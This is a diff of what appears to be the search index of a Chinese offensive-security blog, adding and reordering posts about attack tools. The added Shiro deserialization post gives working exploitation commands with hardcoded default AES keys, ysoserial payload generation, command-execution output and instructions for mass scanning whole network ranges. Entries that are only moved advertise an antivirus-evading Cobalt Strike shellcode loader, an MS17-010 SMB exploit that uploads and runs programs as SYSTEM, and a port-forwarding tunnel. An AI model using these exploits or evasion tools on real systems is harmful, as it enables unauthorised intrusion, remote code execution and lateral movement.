@@ -2818,6 +2818,93 @@ window.location.href="http://k8gege.org/Ladon/LadonGo.html";
       </tags>
   </entry>
   <entry>
+    <title>Ladon ShiroEXP高效爆破Key Shiro反序列化漏洞复现</title>
+    <url>/p/shiroexp.html</url>
+    <content><![CDATA[<p style="color:#fff;"> 
+<% <span class="archive-article-date">
+Visit <span id="busuanzi_value_page_pv"></span>
+
+%>
+</%></p>
+
+
+<p>Ladon ShiroEXP 高效爆破Key Shiro反序列化漏洞复现</p>
+<h3 id="功能简介"><a href="#功能简介" class="headerlink" title="功能简介"></a>功能简介</h3><p>
+支持执行自定义payload (ysoserial)
+一键爆破Shiro Key 自动CBC/GCM 支持keys.txt
+多线程检测1100+仅需几十秒
+一键检测 反序列化 利用链
+Shiro高版本GCM回显命令执行(不出网)
+Shiro低版本CBC回显命令执行(不出网)
+输出ShiroExp.log
+
+</p><p>命令执行-回显利用链<br>CommonsCollectionsK2<br>CommonsBeanutils2<br>Jdk7u21<br>Jdk8u20<br>CommonsBeanutils1<br>CommonsCollectionsK1</p>
+<p></p>
+
+<h3 id="Shiro反序列化漏洞原理"><a href="#Shiro反序列化漏洞原理" class="headerlink" title="Shiro反序列化漏洞原理"></a>Shiro反序列化漏洞原理</h3><p>由于Apache Shiro cookie中通过 AES-128-CBC、AES-128-GCM 模式加密的rememberMe字段存在问题，用户可通过Padding Oracle 加密生成的攻击代码来构造恶意的rememberMe字段，并重新请求网站，进行反序列化攻击，最终导致任意代码执行。</p>
+<h3 id="爆破Shiro-Key"><a href="#爆破Shiro-Key" class="headerlink" title="爆破Shiro Key"></a>爆破Shiro Key</h3><p>内置1000+默认Key，多线程一键爆破(自动AES、GCM加密)，几秒验证<br>支持对Shiro-550（硬编码秘钥）和Shiro-721（Padding Oracle）的一键化检测</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Ladon ShiroExp http://192.168.1.8 check</span><br><span class="line">Ladon ShiroKey http://192.168.1.8</span><br></pre></td></tr></table></figure>
+
+<p><img alt="image" data-original="https://k8gege.org/k8img/Ladon/exp/shiro/key.png"></p>
+<p><img alt="image" data-original="https://k8gege.org/k8img/Ladon/exp/shiro/key2.png"></p>
+<h3 id="爆破利用链"><a href="#爆破利用链" class="headerlink" title="爆破利用链"></a>爆破利用链</h3><p>内置1000+默认Key，多线程一键爆破(自动AES-CBC、AES-GCM加密)，几秒验证</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Ladon ShiroExp http://192.168.1.8 zSyK5Kp6PZAAjlT+eeNMlg== cbc check</span><br><span class="line">Ladon ShiroExp http://192.168.1.8 zSyK5Kp6PZAAjlT+eeNMlg== gcm check</span><br></pre></td></tr></table></figure>
+
+<p><img alt="image" data-original="https://k8gege.org/k8img/Ladon/exp/shiro/gadget.png"></p>
+<h3 id="ShiroEXP-漏洞利用"><a href="#ShiroEXP-漏洞利用" class="headerlink" title="ShiroEXP 漏洞利用"></a>ShiroEXP 漏洞利用</h3><p>使用爆破出来的对应利用链，无回显执行命令</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Ladon ShiroExp http://192.168.1.8 zSyK5Kp6PZAAjlT+eeNMlg== cbc CommonsBeanutils1 whoami</span><br><span class="line">Ladon ShiroExp http://192.168.1.8 zSyK5Kp6PZAAjlT+eeNMlg== gcm CommonsBeanutils1 whoami</span><br></pre></td></tr></table></figure>
+
+<p><img alt="image" data-original="https://k8gege.org/k8img/Ladon/exp/shiro/exp.png"></p>
+<h3 id="Rouyi-4-x漏洞利用"><a href="#Rouyi-4-x漏洞利用" class="headerlink" title="Rouyi 4.x漏洞利用"></a>Rouyi 4.x漏洞利用</h3><p>Rouyi4Exp只针对4.X默认Key(zSyK5Kp6PZAAjlT+eeNMlg==)，利用链CommonsBeanutils1的一键利用。对于其它版本，最好还是使用ShiroExp模块，这个针对所有使用Shiro框架的CMS</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Ladon Rouyi4Exp http://192.168.1.8 whoami</span><br><span class="line">Ladon ShiroExp http://192.168.1.8 zSyK5Kp6PZAAjlT+eeNMlg== cbc CommonsBeanutils1 whoami</span><br><span class="line">Ladon ShiroExp http://192.168.1.8 zSyK5Kp6PZAAjlT+eeNMlg== gcm CommonsBeanutils1 whoami</span><br></pre></td></tr></table></figure>
+
+<p><img alt="image" data-original="https://k8gege.org/k8img/Ladon/exp/shiro/Rouyi4Exp.png"></p>
+<h3 id="执行自定义payload"><a href="#执行自定义payload" class="headerlink" title="执行自定义payload"></a>执行自定义payload</h3><h4 id="ysoserial生成payload"><a href="#ysoserial生成payload" class="headerlink" title="ysoserial生成payload"></a>ysoserial生成payload</h4><p>Shiro利用链CommonsBeanutils1，所以payload必须使用CommonsBeanutils1封装，并不是任意class都能执行，要不然还爆破利用链的干嘛？因为目标引用了这个库，才能反序列化执行命令，并不是单纯知道KEY，就能执行。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java -jar ysoserial.jar CommonsBeanutils1 <span class="string">"touch /tmp/k8gege.txt"</span> &gt; yso.ser</span><br></pre></td></tr></table></figure>
+
+<p>使用对应KEY 对应加密方式 执行payload 如shiro低版本 AES-CBC对应KEY加密，再发送加密后的cookie，所以这是为什么直接抓别人包，发送YSO生成payload无效的原因，一定要了解整个EXP通信原理，而不是表面理解，只知道通过remberME字段反序列化，可是让自己构造个payload，都不知道要封装成对应的，随意找个class当然不行啊，除非是原生JAVA，且支持所有java版本的class，明显没有，存在通用反序化payload的话就不需要ysoserial工具了。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Ladon ShiroExp http://192.168.50.223:8080 kPH+bIxk5D2deZiIxcaaaA== cbc diy yso.ser</span><br></pre></td></tr></table></figure>
+
+
+<h4 id="检测是否执行成功"><a href="#检测是否执行成功" class="headerlink" title="检测是否执行成功"></a>检测是否执行成功</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Ladon ShiroExp http://192.168.50.223:8080 kPH+bIxk5D2deZiIxcaaaA== cbc CommonsCollectionsK1 <span class="string">"ls /tmp"</span></span><br><span class="line"></span><br><span class="line">http://192.168.50.223:8080 IsShiro</span><br><span class="line">Exp...</span><br><span class="line">Res:</span><br><span class="line">hsperfdata_root</span><br><span class="line">k8gege.txt ---</span><br><span class="line">tomcat-docbase.6132634819123728545.8080</span><br><span class="line">tomcat.2080411627486188816.8080</span><br></pre></td></tr></table></figure>
+
+<h4 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Apache Shiro &lt; 1.2.4</span><br><span class="line"></span><br><span class="line">RuoYi 版本号 对象版本的默认AES密钥</span><br><span class="line">4.6.1-4.3.1 zSyK5Kp6PZAAjlT+eeNMlg==</span><br><span class="line">3.4-及以下 fCq+/xW488hMTCD+cmJ3aQ==</span><br></pre></td></tr></table></figure>
+
+
+<h3 id="Shiro框架检测"><a href="#Shiro框架检测" class="headerlink" title="Shiro框架检测"></a>Shiro框架检测</h3><p>模块IsShiro，Cobalt Strike下命令用法一致,但无需上传EXE至目标，内存加载，隐蔽性高</p>
+<h3 id="指定URL"><a href="#指定URL" class="headerlink" title="指定URL"></a>指定URL</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Ladon http://192.168.1.8 IsShiro</span><br></pre></td></tr></table></figure>
+
+<h3 id="指定IP"><a href="#指定IP" class="headerlink" title="指定IP"></a>指定IP</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Ladon 192.168.1.8 IsShiro</span><br></pre></td></tr></table></figure>
+
+<h3 id="批量URL"><a href="#批量URL" class="headerlink" title="批量URL"></a>批量URL</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Ladon url.txt IsShiro</span><br></pre></td></tr></table></figure>
+<p>PS：TXT可存放IP、IP:Port、URL等格式</p>
+<h3 id="批量IP"><a href="#批量IP" class="headerlink" title="批量IP"></a>批量IP</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Ladon ip.txt IsShiro</span><br><span class="line">Ladon noping ip.txt IsShiro</span><br></pre></td></tr></table></figure>
+
+
+<h3 id="指定C段"><a href="#指定C段" class="headerlink" title="指定C段"></a>指定C段</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Ladon 192.168.1.8/24 IsShiro</span><br><span class="line">Ladon noping 192.168.1.8/24 IsShiro</span><br><span class="line"></span><br><span class="line">Ladon 192.168.1.8/24 IsShiro</span><br><span class="line">Ladon noping 192.168.1.8/24 IsShiro</span><br></pre></td></tr></table></figure>
+
+<h3 id="指定B段"><a href="#指定B段" class="headerlink" title="指定B段"></a>指定B段</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Ladon 192.168.1.8/b IsShiro</span><br><span class="line">Ladon noping 192.168.1.8/b IsShiro</span><br><span class="line"></span><br><span class="line">Ladon 192.168.1.8/b IsShiro</span><br><span class="line">Ladon noping 192.168.1.8/b IsShiro</span><br></pre></td></tr></table></figure>
+
+<h3 id="指定A段"><a href="#指定A段" class="headerlink" title="指定A段"></a>指定A段</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Ladon 192.168.1.8/a IsShiro</span><br><span class="line">Ladon noping 192.168.1.8/a IsShiro</span><br><span class="line"></span><br><span class="line">Ladon 192.168.1.8/a IsShiro</span><br><span class="line">Ladon noping 192.168.1.8/a IsShiro</span><br></pre></td></tr></table></figure>
+
+<h3 id="批量C段"><a href="#批量C段" class="headerlink" title="批量C段"></a>批量C段</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Ladon ip24.txt IsShiro</span><br><span class="line">Ladon ipc.txt IsShiro</span><br><span class="line"></span><br><span class="line">Ladon noping ip24.txt IsShiro</span><br><span class="line">Ladon noping ipc.txt IsShiro</span><br></pre></td></tr></table></figure>
+<p>PS: TXT存放多个目标的C段IP</p>
+<h3 id="批量B段"><a href="#批量B段" class="headerlink" title="批量B段"></a>批量B段</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Ladon ip16.txt IsShiro</span><br><span class="line">Ladon noping ip16.txt IsShiro</span><br></pre></td></tr></table></figure>
+<p>PS: TXT存放多个目标的B段IP</p>
+<h3 id="批量网段"><a href="#批量网段" class="headerlink" title="批量网段"></a>批量网段</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Ladon cidr.txt IsShiro</span><br><span class="line">Ladon noping cidr.txt IsShiro</span><br></pre></td></tr></table></figure>
+<p>PS: TXT存放各种IP网段，全网无差别扫描</p>
+<h3 id="更多功能-使用教程"><a href="#更多功能-使用教程" class="headerlink" title="更多功能 使用教程"></a>更多功能 使用教程</h3><p><a href="http://k8gege.org/Ladon/">http://k8gege.org/Ladon/</a></p>
+]]></content>
+      <categories>
+        <category>Ladon</category>
+        <category>EXP</category>
+      </categories>
+      <tags>
+        <tag>EXP</tag>
+        <tag>Shiro</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>FortiManager CVE-2024-47575 RCE漏洞复现</title>
     <url>/p/CVE-2024-47575.html</url>
     <content><![CDATA[<p style="color:#fff;"> 
@@ -6873,11 +6960,11 @@ WIN-OLDM1T2H9M4                     WIN-OLDM1T2H9M4          </code></pre>
       <categories>
         <category>Ladon</category>
         <category>.NET</category>
-        <category>源码</category>
         <category>主机发现</category>
+        <category>源码</category>
         <category>内网渗透</category>
-        <category>编程</category>
         <category>信息收集</category>
+        <category>编程</category>
       </categories>
       <tags>
         <tag>Ladon</tag>
@@ -8602,35 +8689,6 @@ Microsoft Windows 10 for 32-bit Systems 0
       </tags>
   </entry>
   <entry>
-    <title>CobaltStrike &amp; Metasploit Shellcode一键免杀工具</title>
-    <url>/p/9cffe32c.html</url>
-    <content><![CDATA[<p><span style="font-size: 18px;"><strong>0x001 前言</strong></span></p>
-<p>CobaltStrike &amp; Metasploit&nbsp; Shellcode一键免杀工具</p>
-<p>加载器通过AES加密ShellCode，动态编译生成EXE。</p>
-<p><img alt data-original="https://k8gege.org/k8img/posts/scencode.png"></p>
-<p>1个月前该工具生成的exe免杀所有杀软，现在未测应该还能过90%的杀软吧。</p>
-<p>可选.net版本为系统安装对应版本，1.0仅支持.net EXE生成。</p>
-<p>后续版本不一定公开，望大家见谅，有兴趣的自行反编译生成的exe就知道怎么弄了。</p>
-<p><strong>注意</strong>: <span style="color: #ff00ff;">一定要使用无后门特征的CS,否则上线1分钟就被个别杀软查杀</span>(因为CS默认每分钟发送流量包,里面包含后门特征信息)</p>
-<p><strong>声明</strong>: 程序<span style="color: #ff00ff;">仅免杀shellcode</span>部分,CS加载的<span style="color: #ff00ff;">其它模块不免杀</span>(比如运行mimikaz读取密码被个别杀软查杀)</p>
-<p>CS其它模块免杀，请自行修改CS客户端资源里对应的DLL，比如mimikaz_x86.dll、mimikaz_x64.dll</p>
-<p>&nbsp;</p>
-<p><span style="font-size: 18px; color: #ff00ff;"><strong>0x002 下载</strong> </span></p>
-<p><span style="font-size: 14px;"><a href="https://github.com/k8gege/K8tools/raw/master/K8_SC_ENCODE(CobaltStrike%20%26%20Metasploit%20Shellcode%E5%85%8D%E6%9D%80%E5%B7%A5%E5%85%B7).rar" target="_blank">https://github.com/k8gege/K8tools/raw/master/K8_SC_ENCODE(CobaltStrike &amp; Metasploit Shellcode免杀工具).rar</a></span></p>]]></content>
-      <categories>
-        <category>工具</category>
-        <category>免杀</category>
-        <category>Cobalt Strike</category>
-        <category>Metasploit</category>
-        <category>ShellCode</category>
-      </categories>
-      <tags>
-        <tag>Tool</tag>
-        <tag>Cobalt Strike</tag>
-        <tag>Metasploit</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Cobalt Strike TeamServer For Windows</title>
     <url>/p/22e5f4a8.html</url>
     <content><![CDATA[<p><img alt data-original="https://k8gege.org/k8img/posts/TeamServer.png"></p>
@@ -8648,6 +8706,35 @@ Microsoft Windows 10 for 32-bit Systems 0
       <tags>
         <tag>Tool</tag>
         <tag>Cobalt Strike</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>CobaltStrike &amp; Metasploit Shellcode一键免杀工具</title>
+    <url>/p/9cffe32c.html</url>
+    <content><![CDATA[<p><span style="font-size: 18px;"><strong>0x001 前言</strong></span></p>
+<p>CobaltStrike &amp; Metasploit&nbsp; Shellcode一键免杀工具</p>
+<p>加载器通过AES加密ShellCode，动态编译生成EXE。</p>
+<p><img alt data-original="https://k8gege.org/k8img/posts/scencode.png"></p>
+<p>1个月前该工具生成的exe免杀所有杀软，现在未测应该还能过90%的杀软吧。</p>
+<p>可选.net版本为系统安装对应版本，1.0仅支持.net EXE生成。</p>
+<p>后续版本不一定公开，望大家见谅，有兴趣的自行反编译生成的exe就知道怎么弄了。</p>
+<p><strong>注意</strong>: <span style="color: #ff00ff;">一定要使用无后门特征的CS,否则上线1分钟就被个别杀软查杀</span>(因为CS默认每分钟发送流量包,里面包含后门特征信息)</p>
+<p><strong>声明</strong>: 程序<span style="color: #ff00ff;">仅免杀shellcode</span>部分,CS加载的<span style="color: #ff00ff;">其它模块不免杀</span>(比如运行mimikaz读取密码被个别杀软查杀)</p>
+<p>CS其它模块免杀，请自行修改CS客户端资源里对应的DLL，比如mimikaz_x86.dll、mimikaz_x64.dll</p>
+<p>&nbsp;</p>
+<p><span style="font-size: 18px; color: #ff00ff;"><strong>0x002 下载</strong> </span></p>
+<p><span style="font-size: 14px;"><a href="https://github.com/k8gege/K8tools/raw/master/K8_SC_ENCODE(CobaltStrike%20%26%20Metasploit%20Shellcode%E5%85%8D%E6%9D%80%E5%B7%A5%E5%85%B7).rar" target="_blank">https://github.com/k8gege/K8tools/raw/master/K8_SC_ENCODE(CobaltStrike &amp; Metasploit Shellcode免杀工具).rar</a></span></p>]]></content>
+      <categories>
+        <category>工具</category>
+        <category>Cobalt Strike</category>
+        <category>免杀</category>
+        <category>Metasploit</category>
+        <category>ShellCode</category>
+      </categories>
+      <tags>
+        <tag>Tool</tag>
+        <tag>Cobalt Strike</tag>
+        <tag>Metasploit</tag>
       </tags>
   </entry>
   <entry>
@@ -8793,6 +8880,46 @@ Microsoft Windows 10 for 32-bit Systems 0
       </tags>
   </entry>
   <entry>
+    <title>.NET端口转发工具PortTran</title>
+    <url>/p/3f55538f.html</url>
+    <content><![CDATA[<p><span style="font-size: 18px;"><strong>0x001 简介</strong></span></p>
+<p>PortTran by k8gege<br>.NET版端口转发工具，支持任意权限下转发 </p>
+<p><span style="font-size: 18px;"><strong>0x002 背景</strong></span><br>工具在2016年左右写的，当时某个内网不知何原故LCX用不了</p>
+<p>由于Win2003才刚停更不久，依然有不少内网还是03的机器</p>
+<p>加上.NET版的兼容性均没LCX好，所以我自己也很少用...</p>
+<p>以至于忘了自己有弄过这玩意，现在基本都WIN7以后系统</p>
+<p>.net程序不用慌了，体积小和易于免杀大家都开心了。</p>
+<p><span style="font-size: 18px;"><strong>0x003 用法</strong></span></p>
+<div class="cnblogs_Highlighter">
+<pre class="brush:python;gutter:true;">0x001 VPS监听
+PortTranS.exe 8000 338
+
+<p>0x002 目标内网转发<br>PortTranC20.exe 192.168.1.103 3389 192.168.1.102 8000</p>
+<p>0x003 VPS连接3389<br>mstsc /console /v:127.0.0.1:338<br></p></pre><p></p>
+</div>
+<p><span style="font-size: 18px;"><strong>&nbsp;0x004 实例 </strong></span></p>
+<p>1.vps监听</p>
+<p><img alt data-original="https://k8gege.org/k8img/posts/PortTran1.png"></p>
+<p>2.目标内网3389端口转发</p>
+<p><img alt data-original="https://k8gege.org/k8img/posts/PortTran2.png"></p>
+<p>3. 连接VPS的338端口即为被转发内网机器的3389，同理可转发其它端口，使用对应的工具连接就可以了</p>
+<p><img alt data-original="https://k8gege.org/k8img/posts/PortTran3.png"></p>
+<p>不要死板，很多人误以为只能用于转发3389，这是因为不理解什么叫端口转发，如果只能转特定端口</p>
+<p>就不会起名叫端口转发了，应该叫3389转发，1433、1521等端口不是端口吗？内网访问不了你都可以转出来</p>
+<p>再使用对应数据库连接工具连接啊，要懂得举一反三，不要死脑筋，只懂用于转发3389。</p>
+<p><span style="font-size: 18px; color: #ff00ff;"><strong>0x005 下载</strong></span></p>
+<p><a href="https://github.com/k8gege/K8tools/raw/master/PortTran.rar" target="_blank">https://github.com/k8gege/PortTran</a></p>
+<p>&nbsp;</p>]]></content>
+      <categories>
+        <category>工具</category>
+        <category>.NET</category>
+      </categories>
+      <tags>
+        <tag>Tool</tag>
+        <tag>PortTran</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Python免杀ShellCode加载器(Cobalt Strike/Metasploit)</title>
     <url>/p/f3512dbc.html</url>
     <content><![CDATA[<p><span style="font-size: 18px;"><strong>0x001 原理</strong></span></p>
@@ -8893,8 +9020,8 @@ ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
 <p>基本都是白名单加载DLL，DLL释放各种加密文件，再解密执行，最终加载CS而已。</p>]]></content>
       <categories>
         <category>工具</category>
-        <category>免杀</category>
         <category>Cobalt Strike</category>
+        <category>免杀</category>
         <category>Metasploit</category>
         <category>ShellCode</category>
         <category>Python</category>
@@ -8904,6 +9031,33 @@ ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
         <tag>Cobalt Strike</tag>
         <tag>Metasploit</tag>
         <tag>BypassAV</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>SMB溢出工具加强版</title>
+    <url>/p/68a8bf1b.html</url>
+    <content><![CDATA[<p><strong>工具:</strong>k8加强版zzz</p>
+<p><strong>编译:</strong>python</p>
+<p><strong>漏洞:</strong>MS17-010</p>
+<p><strong>用法:</strong></p>
+<p>zzz_exploit.exe 192.11.22.82<br>zzz_exploit.exe 192.11.22.82 exe参数<br>zzz_exploit.exe 192.11.22.82 exe参数 管道名</p>
+<p>如exe启动参数为&nbsp; m.exe -Start 实战命令为 zzz_exploit.exe 192.11.22.82 -Start</p>
+<p><strong>内网批量</strong></p>
+<p>可结合cping批量溢出内网,将名称改为smbcheck即可,但exe必须使用无参版。（其它工具也可以，提供个IP参数即可）</p>
+<p>因为cping只会传IP进去,不会传其它参数。使用前需将任意exe改名为ma.dat</p>
+<p>溢出成功会自动将exe传入目标机器，并以system权限启动exe程序。</p>
+<p><img alt data-original="https://k8gege.org/k8img/posts/k8zzz.png"></p>
+<p>&nbsp;</p>
+<p>链接: <a href="https://github.com/k8gege/K8tools" target="_blank">https://github.com/k8gege/K8tools/blob/master/k8zzz.rar</a></p>]]></content>
+      <categories>
+        <category>Exp</category>
+        <category>提权</category>
+      </categories>
+      <tags>
+        <tag>Exp</tag>
+        <tag>Tool</tag>
+        <tag>MS17010</tag>
+        <tag>SMB</tag>
       </tags>
   </entry>
   <entry>
@@ -9210,33 +9364,6 @@ xxe_data = r"""&lt;!DOCTYPE Autodiscover [
       </tags>
   </entry>
   <entry>
-    <title>SMB溢出工具加强版</title>
-    <url>/p/68a8bf1b.html</url>
-    <content><![CDATA[<p><strong>工具:</strong>k8加强版zzz</p>
-<p><strong>编译:</strong>python</p>
-<p><strong>漏洞:</strong>MS17-010</p>
-<p><strong>用法:</strong></p>
-<p>zzz_exploit.exe 192.11.22.82<br>zzz_exploit.exe 192.11.22.82 exe参数<br>zzz_exploit.exe 192.11.22.82 exe参数 管道名</p>
-<p>如exe启动参数为&nbsp; m.exe -Start 实战命令为 zzz_exploit.exe 192.11.22.82 -Start</p>
-<p><strong>内网批量</strong></p>
-<p>可结合cping批量溢出内网,将名称改为smbcheck即可,但exe必须使用无参版。（其它工具也可以，提供个IP参数即可）</p>
-<p>因为cping只会传IP进去,不会传其它参数。使用前需将任意exe改名为ma.dat</p>
-<p>溢出成功会自动将exe传入目标机器，并以system权限启动exe程序。</p>
-<p><img alt data-original="https://k8gege.org/k8img/posts/k8zzz.png"></p>
-<p>&nbsp;</p>
-<p>链接: <a href="https://github.com/k8gege/K8tools" target="_blank">https://github.com/k8gege/K8tools/blob/master/k8zzz.rar</a></p>]]></content>
-      <categories>
-        <category>Exp</category>
-        <category>提权</category>
-      </categories>
-      <tags>
-        <tag>Exp</tag>
-        <tag>Tool</tag>
-        <tag>MS17010</tag>
-        <tag>SMB</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>CVE-2018-2628 Weblogic GetShell Exploit</title>
     <url>/p/b8e58f69.html</url>
     <content><![CDATA[<h2 id="漏洞简介">漏洞简介</h2>
@@ -9375,11 +9502,11 @@ from pprint import pprint
 <p><a href="https://www.cnblogs.com/k8gege/p/10367844.html" target="_blank">https://www.cnblogs.com/k8gege/p/10367844.html</a></p>]]></content>
       <categories>
         <category>工具</category>
-        <category>源码</category>
         <category>主机发现</category>
+        <category>源码</category>
         <category>内网渗透</category>
-        <category>编程</category>
         <category>信息收集</category>
+        <category>编程</category>
         <category>嗅探</category>
         <category>Python</category>
       </categories>
@@ -9387,46 +9514,6 @@ from pprint import pprint
         <tag>Tool</tag>
         <tag>Code</tag>
         <tag>Python</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>.NET端口转发工具PortTran</title>
-    <url>/p/3f55538f.html</url>
-    <content><![CDATA[<p><span style="font-size: 18px;"><strong>0x001 简介</strong></span></p>
-<p>PortTran by k8gege<br>.NET版端口转发工具，支持任意权限下转发 </p>
-<p><span style="font-size: 18px;"><strong>0x002 背景</strong></span><br>工具在2016年左右写的，当时某个内网不知何原故LCX用不了</p>
-<p>由于Win2003才刚停更不久，依然有不少内网还是03的机器</p>
-<p>加上.NET版的兼容性均没LCX好，所以我自己也很少用...</p>
-<p>以至于忘了自己有弄过这玩意，现在基本都WIN7以后系统</p>
-<p>.net程序不用慌了，体积小和易于免杀大家都开心了。</p>
-<p><span style="font-size: 18px;"><strong>0x003 用法</strong></span></p>
-<div class="cnblogs_Highlighter">
-<pre class="brush:python;gutter:true;">0x001 VPS监听
-PortTranS.exe 8000 338
-
-<p>0x002 目标内网转发<br>PortTranC20.exe 192.168.1.103 3389 192.168.1.102 8000</p>
-<p>0x003 VPS连接3389<br>mstsc /console /v:127.0.0.1:338<br></p></pre><p></p>
-</div>
-<p><span style="font-size: 18px;"><strong>&nbsp;0x004 实例 </strong></span></p>
-<p>1.vps监听</p>
-<p><img alt data-original="https://k8gege.org/k8img/posts/PortTran1.png"></p>
-<p>2.目标内网3389端口转发</p>
-<p><img alt data-original="https://k8gege.org/k8img/posts/PortTran2.png"></p>
-<p>3. 连接VPS的338端口即为被转发内网机器的3389，同理可转发其它端口，使用对应的工具连接就可以了</p>
-<p><img alt data-original="https://k8gege.org/k8img/posts/PortTran3.png"></p>
-<p>不要死板，很多人误以为只能用于转发3389，这是因为不理解什么叫端口转发，如果只能转特定端口</p>
-<p>就不会起名叫端口转发了，应该叫3389转发，1433、1521等端口不是端口吗？内网访问不了你都可以转出来</p>
-<p>再使用对应数据库连接工具连接啊，要懂得举一反三，不要死脑筋，只懂用于转发3389。</p>
-<p><span style="font-size: 18px; color: #ff00ff;"><strong>0x005 下载</strong></span></p>
-<p><a href="https://github.com/k8gege/K8tools/raw/master/PortTran.rar" target="_blank">https://github.com/k8gege/PortTran</a></p>
-<p>&nbsp;</p>]]></content>
-      <categories>
-        <category>工具</category>
-        <category>.NET</category>
-      </categories>
-      <tags>
-        <tag>Tool</tag>
-        <tag>PortTran</tag>
       </tags>
   </entry>
   <entry>
